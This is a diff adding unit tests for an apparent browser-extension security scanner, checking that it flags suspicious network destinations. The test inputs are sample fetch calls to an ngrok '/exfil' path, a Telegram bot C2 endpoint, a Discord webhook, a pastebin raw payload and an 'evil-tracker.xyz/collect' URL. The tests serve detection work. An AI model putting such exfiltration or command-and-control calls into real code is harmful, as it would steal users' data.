@@ -749,3 +749,54 @@ describe('Baseline & Diff', () => {
     assert.strictEqual(diff.driftScore, 0);
   });
 });
+
+// =============================================
+// Suspicious Domain Detection
+// =============================================
+
+describe('Suspicious Domain Detection', () => {
+  const ext = { id: 'test-ext', path: '/tmp' };
+  const manifest = { name: 'TestExt', manifest_version: 3 };
+
+  test('detects raw IP connections', () => {
+    const code = 'fetch("http://192.168.1.100/api/data")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(findings.some(f => f.id.includes('suspicious-domain') && f.message.includes('IP address')));
+  });
+
+  test('detects ngrok tunnels', () => {
+    const code = 'fetch("https://abc123.ngrok.io/exfil")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('ngrok')));
+  });
+
+  test('detects Telegram bot C2', () => {
+    const code = 'fetch("https://api.telegram.org/bot123456:ABC/sendMessage")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('Telegram')));
+  });
+
+  test('detects Discord webhook exfil', () => {
+    const code = 'fetch("https://discord.com/api/webhooks/123/abc")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('Discord')));
+  });
+
+  test('detects pastebin payload', () => {
+    const code = 'fetch("https://pastebin.com/raw/abc123")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('paste')));
+  });
+
+  test('detects suspicious TLDs', () => {
+    const code = 'fetch("https://evil-tracker.xyz/collect")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(findings.some(f => f.message.includes('suspicious TLD')));
+  });
+
+  test('does not flag legitimate URLs', () => {
+    const code = 'fetch("https://googleapis.com/api/v1/data")';
+    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
+    assert.ok(!findings.some(f => f.id.includes('suspicious-domain')));
+  });
+});
